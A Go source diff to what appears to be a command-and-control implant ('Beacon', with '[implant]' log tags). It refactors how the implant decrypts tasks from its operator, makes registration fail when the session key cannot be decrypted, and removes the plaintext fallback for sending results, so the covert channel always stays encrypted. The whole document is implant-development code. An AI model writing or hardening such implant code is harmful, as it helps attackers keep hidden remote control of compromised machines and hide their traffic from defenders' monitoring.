@@ -101,21 +101,7 @@ func (b *Beacon) Run() {
 		}
 
 		// 6. Execute response tasks, append results to pendingResults
-		// Decrypt tasks if session key is active
-		taskList := resp.Tasks
-		if b.sessionKey != nil && len(resp.EncryptedTasks) > 0 {
-			plaintext, err := zcrypto.AESDecrypt(b.sessionKey, resp.EncryptedTasks)
-			if err != nil {
-				log.Printf("[implant] decrypt tasks error: %v", err)
-			} else {
-				payload := &pb.BeaconTasksPayload{}
-				if err := proto.Unmarshal(plaintext, payload); err != nil {
-					log.Printf("[implant] unmarshal decrypted tasks error: %v", err)
-				} else {
-					taskList = payload.Tasks
-				}
-			}
-		}
+		taskList := b.decryptTasks(resp)
 
 		for _, task := range taskList {
 			if task.TaskType == pb.TaskType_TASK_EXIT {
@@ -173,15 +159,14 @@ func (b *Beacon) register() error {
 		b.sleep = time.Duration(resp.NextCheckinMs) * time.Millisecond
 	}
 
-	// Decrypt session key if provided
+	// Decrypt session key if provided — fail registration on error to avoid half-encrypted sessions.
 	if len(resp.EncryptedSessionKey) > 0 {
 		sessionKey, err := zcrypto.AESDecrypt(b.config.Secret, resp.EncryptedSessionKey)
 		if err != nil {
-			log.Printf("[implant] failed to decrypt session key: %v", err)
-		} else {
-			b.sessionKey = sessionKey
-			log.Printf("[implant] session key established")
+			return fmt.Errorf("decrypt session key: %w", err)
 		}
+		b.sessionKey = sessionKey
+		log.Printf("[implant] session key established")
 	}
 
 	return nil
@@ -198,23 +183,20 @@ func (b *Beacon) sendResults(results []*pb.TaskResult) *pb.BeaconResponse {
 		Hmac:      hmac,
 	}
 
-	// Encrypt results if session key is active
 	if b.sessionKey != nil && len(results) > 0 {
 		payload := &pb.BeaconResultsPayload{Results: results}
 		plaintext, err := proto.Marshal(payload)
 		if err != nil {
 			log.Printf("[implant] marshal results payload error: %v", err)
-			beacon.Results = results // fallback to plaintext
-		} else {
-			encrypted, err := zcrypto.AESEncrypt(b.sessionKey, plaintext)
-			if err != nil {
-				log.Printf("[implant] encrypt results error: %v", err)
-				beacon.Results = results // fallback to plaintext
-			} else {
-				beacon.EncryptedResults = encrypted
-			}
+			return nil
 		}
-	} else {
+		encrypted, err := zcrypto.AESEncrypt(b.sessionKey, plaintext)
+		if err != nil {
+			log.Printf("[implant] encrypt results error: %v", err)
+			return nil
+		}
+		beacon.EncryptedResults = encrypted
+	} else if b.sessionKey == nil {
 		beacon.Results = results
 	}
 
@@ -227,6 +209,26 @@ func (b *Beacon) sendResults(results []*pb.TaskResult) *pb.BeaconResponse {
 }
 
 const maxSleepMs = 86400000 // 24 hours
+
+func (b *Beacon) decryptTasks(resp *pb.BeaconResponse) []*pb.Task {
+	if b.sessionKey == nil {
+		return resp.Tasks
+	}
+	if len(resp.EncryptedTasks) == 0 {
+		return nil
+	}
+	plaintext, err := zcrypto.AESDecrypt(b.sessionKey, resp.EncryptedTasks)
+	if err != nil {
+		log.Printf("[implant] decrypt tasks error: %v", err)
+		return nil
+	}
+	payload := &pb.BeaconTasksPayload{}
+	if err := proto.Unmarshal(plaintext, payload); err != nil {
+		log.Printf("[implant] unmarshal decrypted tasks error: %v", err)
+		return nil
+	}
+	return payload.Tasks
+}
 
 func (b *Beacon) handleSleep(task *pb.Task) {
 	sleepTask := &pb.SleepTask{}
